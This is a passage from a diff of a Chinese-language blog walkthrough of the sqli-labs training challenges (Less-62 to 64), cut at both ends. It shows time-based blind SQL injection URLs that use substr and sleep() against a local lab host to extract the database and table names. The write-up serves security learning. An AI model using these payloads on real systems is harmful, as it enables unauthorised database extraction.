+<pre class="line-numbers language-none"><code class="language-none">192.168.220.12&#x2F;sqli&#x2F;Less-62&#x2F;?id&#x3D;1&#39;) and substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1)&#x3D;&#39;c&#39; and if(1&#x3D;1,sleep(2),1) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://user-images.githubusercontent.com/76896357/115133250-5683f280-a039-11eb-8f8f-c3d803a06d32.png" alt="image"></p>
 <p>由于次数的限制只能报出一部分，多试几次吧</p>
 <p>。。。</p>
 <h2 id="63-‘’挑战"><a href="#63-‘’挑战" class="headerlink" title="63. ‘’挑战"></a>63. ‘’挑战</h2><p>闭合方式是’’</p>
 <p>直接延时吧</p>
-<pre><code>http://192.168.220.12/sqli/Less-63/index.php?id=1%27%20and%20substr(database(),1,1)=%27c%27%20and%20if(1=1,sleep(3),1)%20--+
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.220.12&#x2F;sqli&#x2F;Less-63&#x2F;index.php?id&#x3D;1%27%20and%20substr(database(),1,1)&#x3D;%27c%27%20and%20if(1&#x3D;1,sleep(3),1)%20--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p><img src="https://user-images.githubusercontent.com/76896357/115133299-bbd7e380-a039-11eb-8119-0ca9b770bdc2.png" alt="image"></p>
 <h2 id="64-）-方式"><a href="#64-）-方式" class="headerlink" title="64. ）)方式"></a>64. ）)方式</h2><ul>
 <li>闭合方式没猜到，</li>
